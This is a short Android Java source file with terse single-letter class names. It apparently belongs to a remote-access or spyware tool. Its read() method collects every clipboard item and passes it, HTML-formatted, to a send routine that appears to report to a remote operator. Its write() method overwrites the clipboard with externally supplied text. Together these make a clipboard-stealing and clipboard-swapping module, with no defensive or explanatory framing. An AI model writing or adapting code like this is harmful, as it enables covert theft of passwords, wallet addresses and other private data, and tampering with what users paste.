// language: Java, file: v.java, target: Android 16 (SDK 36)
package com.v2ram;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.os.Handler;
import android.os.Looper;

public class v {

    public static void read() {
        Context c = d.ctx;
        if (c == null) return;
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                ClipboardManager cm = (ClipboardManager)
                    c.getSystemService(Context.CLIPBOARD_SERVICE);
                if (cm == null || !cm.hasPrimaryClip()) {
                    d.send("<i>clipboard empty</i>");
                    return;
                }
                ClipData cd = cm.getPrimaryClip();
                if (cd == null || cd.getItemCount() == 0) {
                    d.send("<i>clipboard empty</i>");
                    return;
                }
                StringBuilder b = new StringBuilder("<b>Clipboard</b>\n<pre>");
                for (int i = 0; i < cd.getItemCount(); i++) {
                    CharSequence t = cd.getItemAt(i).coerceToText(c);
                    b.append(d.esc(t == null ? "" : t.toString()));
                    if (i < cd.getItemCount() - 1) b.append("\n---\n");
                }
                b.append("</pre>");
                d.send(b.toString());
            } catch (Throwable t) {
                e.err(t.getMessage());
            }
        });
    }

    public static void write(String text) {
        Context c = d.ctx;
        if (c == null) return;
        if (text == null) return;
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                ClipboardManager cm = (ClipboardManager)
                    c.getSystemService(Context.CLIPBOARD_SERVICE);
                if (cm == null) return;
                cm.setPrimaryClip(ClipData.newPlainText("v2", text));
                d.send("<i>clipboard set</i>");
            } catch (Throwable t) {
                e.err(t.getMessage());
            }
        });
    }
}